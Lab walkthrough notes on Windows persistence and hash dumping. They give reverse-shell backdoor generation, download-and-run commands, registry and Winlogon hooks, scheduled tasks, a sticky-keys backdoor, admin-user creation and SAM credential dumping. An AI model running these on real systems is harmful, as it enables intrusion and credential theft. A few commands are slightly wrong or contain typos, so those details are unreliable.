# Persistence

## What is persistence

Persistence is a post-exploitation activity used by
penetration testers in order to keep access to a system throughout the whole
assessment and not to have to re-exploit the target even if the system restarts.

It can be considered that there are two types of persistence. These two types are:

- Low privileged persistence
- Privileged user persistence

##### Low privileged user persistence

Low privileged persistence means that the penetration tester gained and
uses persistence techniques to keep his access to the target system under
a normal user profile/account (a domain user with no administrative rights).

##### Privileged user persistence

After gaining access to a system,
sometimes (because it would be inaccurate to say always),
a penetration tester will do privilege escalation in order to gain access to
the highest privilege user that can be on a Windows machine (nt authority\system).

After privilege escalation,
he will use persistence in order to keep the access he gained.

##### Keeping persistence

Ways of keeping persistence:

- Startup folder persistence
- Editing registry keys
- Using scheduled tasks
- Using BITS
- Creating a backdoored service
- Creating another user
- Backdooring RDP

## Low privilege user persistence

First of all we need access to the machine.

We can RDP in with `tryhackme:tryhackme123`  
Then we will create a backdoor using msfvenom  
We can do that by:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > backdoor.exe
```

Create a metasploit listener:

```bash
msf5> use exploit/multi/handler
```

Create a quick server with python

```bash
python -m SimpleHTTPServer 80
```

### Delivery methods

##### 1st

Go to Internet Explorer settings and choose "Internet Options"  
Click on the "Security" tab  
Select "Trusted Sites" and then click on the "Sites" button  
Fill the "Add this website to the zone" field with your IP address  
Click the "Add" button  
Navigate to your IP address and download the .exe  

##### 2nd

With Powershell

```powershell
Invoke-WebRequest http://<IP>/backdoor.exe -Outfile .\backdoor.exe
```

##### 3rd

With Powershell and Cmd

```powershell
certutil -urlcache -split -f http://<IP>/backdoor.exe
```

### Startup folder persistence

Supposing we do not consider privilege escalation is necessary and we just want
to have access to the system in case the user restarts the machine the simplest
method would be moving the backdoor to the startup folder.

The path of the startup folder is:

```bash
C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.
```

`%username%` in our case is tryhackme.
Browse to that path and upload the binary you generated with msfvenom.

Since the binary is in the startup folder every time a user restarts its computer
and logs in the backdoor will be executed and Metasploit will receive the connection.

### Editing registries

Depending on the registries a low privileged user might be able to edit them.
With this in mind, an attacker could edit the registries to achieve persistence.

An example of an editable registry is:

```bash
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
```

First, let's move the backdoor to the AppData folder.
You can either move it
from the Startup folder or upload it again to the AppData folder.

```bash
meterpreter> cd %appdata%
meterpreter> pwd
meterpreter> upload backdoor.exe .
```

Drop into a shell and use the `reg add` function to create a registry that
will run our backdoor as follows:

```bash
meterpreter> shell
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\tryhackme\AppData\Roaming\backdoor.exe"
```

### BITS Jobs

BITS (Background Intelligent Transfer Service) is used for file transfer
between machines (downloading or uploading) using idle network bandwidth.

BITS Jobs are containers that contain files that need to be transferred.
However,
when creating the job the container is empty and it needs to be populated
(specify one or more files to be transferred).
It's also needed to add the source and the destination.

Now that we know what BITS is and what jobs are used for let's try achieving persistence.

You can view the BITS help menu by typing:
`bitsadmin` in the command line/the shell you spawned.

Let's create the job:

```bash
C:\Users\tryhackme\AppData\Roaming> bitsadmin /create backdoor
```

Add the file for the job that will be transferred:

```bash
...Roaming> bitsadmin /addfile backdoor "http://<IP>/backdoor.exe" "C:\Users\tryhackme\Documets\backdoor.exe"
```

Now, let's make BITS execute our backdoor:

```bash
...Roaming> bitsadmin /SetNotifyCmdLine 1 cmd.exe "/c bitsadmin.exe /complete backdoor | start /B C:\Users\tryhackme\Documets\backdoor.exe"
```

NULL is used at the end of the syntax because our backdoor
doesn't have any additional parameters.  
Since we want our backdoor to be persistent we'll set a retry delay for the job.

```bash
...Roaming> bitsadmin /SetMinRetryDelay backdoor 30
```

Finally, we'll start/resume the job.

Note:
In order to work you have to have a webserver (i used apache) running so
BITS can download the backdoor and Metasploit listening for connections.

To execute the job type: `bitsadmin /resume`.
As can be observed in the below image we received the second connection.

```bash
...Roaming> bitsadmin /resume backdoor
```

Note: BITS is very unstable and can and might give you just temporary persistence.

## High privilege user persistence

You will find a few things similar to the ones used for the low privileged user persistence.

Log in to the system using the following credentials: `Administrator:Tryhackme123!`

Download again and execute the backdoor you earlier created.

### Creating another admin user

Drop into a shell and create a new user. The syntax is:

```bash
net user /add <USER> <PASSWORD>.
```

Now just add the username to the local administrators' group.

```bash
net localgroup Administrators Backdoor /add
```

By checking the users that are in the Administrators' group we
can see our newly created and added user:

```bash
net localgroup Administrators
```

### Editing the registries

We can backdoor the Winlogon so when a user logs in our backdoor will get executed.

The registry used is:

```bash
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
```

Upload the backdoor if you haven't and add the registry entry. The command is:

```bash
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, <PATH_TO_BINARY>" /f
```

When a user logs in Userinit.exe will be executed and then our backdoor.

### Persistence by creating service

There is the possibility to create a service leveraging
Powershell which will execute our backdoor.

Load Powershell into the meterpreter instance by typing:

```bash
load powershell
```

To drop into a Powershell shell type:

```bash
powershell_shell
```

reate the service using the New-Service cmdlet:

```bash
New-Service -Name "<SERVICE_NAME>" -BinaryPathName "<PATH_TO_BINARY>" -Description "<SERVICE_DESCRIPTION>" -StartupType "Boot"
```

The service is stopped,
but by checking the services you can notice that the service will start automatically:

### Sceduled tasks

Scheduled tasks are used to schedule the launch of
specific programs or scripts at a pre-defined
time or when it meets a condition (Ex: a user logs in).

Powershell
can be used to create a scheduled task and assure persistence but for that,
we'll have to define multiple cmdlets. These are:

1. New-ScheduledTaskAction
2. New-ScheduledTaskTrigger
3. New-ScheduledTaskPrincipal
4. New-ScheduledTaskSettingsSet
5. Register-ScheduledTask

New-ScheduledTaskAction - Is used to define the action that is going to be made.

New-ScheduledTaskTrigger - Defining the trigger (daily/weekly/monthly, etc).
The trigger can be considered a condition that
when met the scheduled task will launch the action.

New-ScheduledTaskPrincipal - Is the user that the task will be run as.

New-ScheduledTaskSettingsSet - This will set our above-mentioned settings.

Register-ScheduledTask - Will create the task.

Knowing this let's create the task using Powershell.

```bash
PS > $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Administrator\Desktop\backdoor.exe"
PS > $B = New-ScheduledTaskTrigger -AtLogOn
PS > $C = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -RunLevel Highest
PS > $D = New-ScheduledTaskSettingsSet
PS > $E = New-ScheduledTaskAction -Action $A -Trigger $B -Principal $C -Settings $D
PS > Register-ScheduledTask Backdoor -InputObject $E
```

Checking Task Scheduler you can see there is a task created and will run
every time a users logs in.

### Backdooring RDP

An example would be using Metasploit to backdoor OSK (On-screen keyboard).

Metasploit sticky_keys module can be used:

```bash
msf5> search sticky
>use 0
>set session 2
>set target osk
>run
```

Sign out/Lock the account and press Windows Key + U and choose On-screen keyboard.
A CMD should be prompted.

The same results can be achieved by editing the registry using the command:

```bash
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

## Hash dumping

### What is hash dumbping

Hash dumping is the technique used by penetration testers to extract the password
hashes off of the target system to either crack them or to try to do lateral movement.
The simplest way to do hash dumping is by using Metasploit's hashdump/kiwi module:

```bash
meterpreter> run post/windows/gather/hashdump
```

The same result can be achieved by saving the SAM and SYSTEM registries,
downloading the files and using samdump2.
Let's save first the registries on the target machine:

```bash
C:\Users\Administrator\Desktop>reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM
...\Desktop>reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM
```

With the registries save download the file to the attacker machine and
use samdump2 to recover the hashes

```bash
meterpreter> cd  'C:\Users\Administrator\Desktop'
> download SAM
> download SYSTEM
```

```bash
samdump2 SYSTEM SAM
```

It seems some users do not appear, only their hashes.
However, for that issue, you can query for users that are on the system.

You can dump credentials using kiwi, which is the equivalent of mimikatz.
To do that you'll need to load the module: `load kiwi`.
The command used to dump the SAM database hashes is: `lsa_dump_sam`

```bash
meterpreter> lsa_dump_sam
> getsystem
> lsa_dump_sam
```

There are more ways of dumping hashes and multiple tools and scripts
that can be used for this purpose.

Note: If planning to use the offline cracking method the passwords are contained
in the following wordlist from seclists:
100k-most-used-passwords-NCSC.txt (/usr/share/seclists/Passwords/Common-Credentials)
